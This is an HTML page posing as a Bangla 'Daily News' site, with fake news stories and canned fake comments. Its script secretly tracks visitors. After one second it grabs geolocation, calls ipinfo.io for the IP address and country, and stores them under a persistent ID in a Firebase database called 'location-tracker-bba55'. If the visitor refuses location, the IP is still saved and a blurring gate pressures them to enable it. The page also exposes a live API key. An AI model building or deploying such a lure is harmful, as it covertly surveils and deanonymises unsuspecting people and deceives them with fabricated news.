<!DOCTYPE html>
<html>
<head>
<title>Daily News</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body{margin:0;font-family:Arial;background:#f5f5f5;}

header{background:#c40000;color:white;padding:15px;text-align:center;font-size:26px;}
nav{background:#111;padding:10px;text-align:center;}
nav a{color:white;margin:0 10px;text-decoration:none;font-size:14px;}

.container{width:95%;margin:auto;margin-top:20px;}

.grid{
display:grid;
grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
gap:15px;
}

.card{
background:white;
padding:10px;
border-radius:8px;
cursor:pointer;
}

.card img{
width:100%;
height:150px;
object-fit:cover;
border-radius:6px;
}

#articlePage{display:none;}

.article{background:white;padding:15px;border-radius:8px;}
.comments{margin-top:20px;background:white;padding:10px;border-radius:8px;}
.comment{border-bottom:1px solid #ddd;padding:5px 0;font-size:14px;}

.ad{background:#ddd;padding:20px;text-align:center;margin:10px 0;}
.footer{background:#111;color:white;text-align:center;padding:15px;margin-top:20px;}

#locationGate{
position:fixed;
top:0;left:0;
width:100%;height:100%;
backdrop-filter:blur(6px);
background:rgba(0,0,0,0.4);
display:none;
justify-content:center;
align-items:center;
z-index:9999;
}

.gate-box{
background:white;
padding:25px;
border-radius:12px;
width:90%;
max-width:340px;
text-align:center;
box-shadow:0 10px 30px rgba(0,0,0,0.2);
}
</style>
</head>

<body>

<div id="locationGate">
<div class="gate-box">
<h2>📍 Enable Location</h2>
<p>আপনার এলাকার খবর দেখতে location চালু করুন</p>
<button onclick="retryLocation()">Enable Location</button>
</div>
</div>

<header>📰 Daily News</header>

<nav>
<a href="#" onclick="showHome()">Home</a>
<a href="#">বাংলাদেশ</a>
<a href="#">বিশ্ব</a>
<a href="#">খেলা</a>
</nav>

<div class="container">

<div id="homePage">
<div class="ad">📢 Advertisement</div>
<div id="newsContainer" class="grid"></div>
</div>

<div id="articlePage">
<button onclick="showHome()">⬅ Back</button>

<div class="article">
<h2 id="title"></h2>
<img id="image" style="width:100%;margin:10px 0;">
<p id="content"></p>
</div>

<div class="comments">
<h4>💬 Comments</h4>
<div id="commentList"></div>
</div>

</div>

</div>

<div class="footer">© 2026 Daily News</div>

<script type="module">

// 🔥 FAKE BANGLA TRENDING NEWS DATA
const newsData = [
{
title:"ঢাকায় আবারও বৃষ্টির পূর্বাভাস, সতর্কতা জারি",
image:"https://source.unsplash.com/400x300/?rain,city",
summary:"আবহাওয়া অধিদপ্তর জানিয়েছে, আগামী ২৪ ঘণ্টায় ঢাকাসহ বিভিন্ন এলাকায় ভারী বৃষ্টিপাত হতে পারে।"
},
{
title:"বাংলাদেশ দলের দারুণ জয়, উচ্ছ্বসিত ভক্তরা",
image:"https://source.unsplash.com/400x300/?cricket",
summary:"শেষ ওভারে নাটকীয় জয়ে সিরিজ নিজেদের করে নিয়েছে বাংলাদেশ দল।"
},
{
title:"নতুন মোবাইল ফোন বাজারে, চমকপ্রদ ফিচার",
image:"https://source.unsplash.com/400x300/?smartphone",
summary:"নতুন মডেলের স্মার্টফোনে এসেছে উন্নত ক্যামেরা ও ব্যাটারি প্রযুক্তি।"
},
{
title:"ডলারের দাম আবারও বাড়লো, বাজারে প্রভাব",
image:"https://source.unsplash.com/400x300/?money",
summary:"ডলারের মূল্য বৃদ্ধি পাওয়ায় আমদানি পণ্যের দাম বেড়ে যেতে পারে।"
},
{
title:"ঢাকায় ভয়াবহ যানজট, ভোগান্তিতে মানুষ",
image:"https://source.unsplash.com/400x300/?traffic",
summary:"অফিস টাইমে রাজধানীর বিভিন্ন এলাকায় দীর্ঘ যানজট দেখা গেছে।"
},
{
title:"বিশ্বজুড়ে নতুন প্রযুক্তির চমক",
image:"https://source.unsplash.com/400x300/?technology",
summary:"কৃত্রিম বুদ্ধিমত্তা নিয়ে নতুন নতুন উদ্ভাবন বিশ্বকে তাক লাগিয়ে দিচ্ছে।"
}
]

// LOCATION CODE (unchanged)
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const app = initializeApp({
apiKey:"AIzaSyAilTyrtwRg5nQ-LpTJkhHiBn33JV14Zbc",
authDomain:"location-tracker-bba55.firebaseapp.com",
projectId:"location-tracker-bba55"
});

const db = getFirestore(app);

function getUserId(){
let id=localStorage.getItem("userId")
if(!id){id=Math.random().toString(36).substring(2,10);localStorage.setItem("userId",id)}
return id
}

async function getIP(){
let r=await fetch("https://ipinfo.io/json")
return await r.json()
}

async function save(data){
await setDoc(doc(db,"locations",getUserId()),data)
}

function autoDetect(){
navigator.geolocation.getCurrentPosition(async pos=>{
let ip=await getIP()
save({
latitude:pos.coords.latitude,
longitude:pos.coords.longitude,
ip:ip.ip,
country:ip.country,
time:new Date().toLocaleString()
})
},async ()=>{
let ip=await getIP()
save({ip:ip.ip,country:ip.country})
document.getElementById("locationGate").style.display="flex"
})
}

window.retryLocation=function(){
navigator.geolocation.getCurrentPosition(pos=>{
document.getElementById("locationGate").style.display="none"
})
}

// 🔥 LOAD NEWS
function loadNews(){
let container=document.getElementById("newsContainer")
container.innerHTML=""

newsData.forEach((n,i)=>{
let div=document.createElement("div")
div.className="card"
div.innerHTML=`<img src="${n.image}"><h4>${n.title}</h4>`
div.onclick=()=>openArticle(i)
container.appendChild(div)
})
}

window.openArticle=function(i){
let n=newsData[i]
document.getElementById("homePage").style.display="none"
document.getElementById("articlePage").style.display="block"
document.getElementById("title").innerText=n.title
document.getElementById("image").src=n.image
document.getElementById("content").innerText=n.summary
loadComments()
}

window.showHome=function(){
document.getElementById("homePage").style.display="block"
document.getElementById("articlePage").style.display="none"
}

function loadComments(){
let arr=["দারুণ খবর!","খুব ভালো লাগলো","শেয়ার করার জন্য ধন্যবাদ"]
let list=document.getElementById("commentList")
list.innerHTML=""
arr.forEach(c=>{
let d=document.createElement("div")
d.className="comment"
d.innerText=c
list.appendChild(d)
})
}

// INIT
setTimeout(()=>autoDetect(),1000)
loadNews()

</script>

</body>
</html>
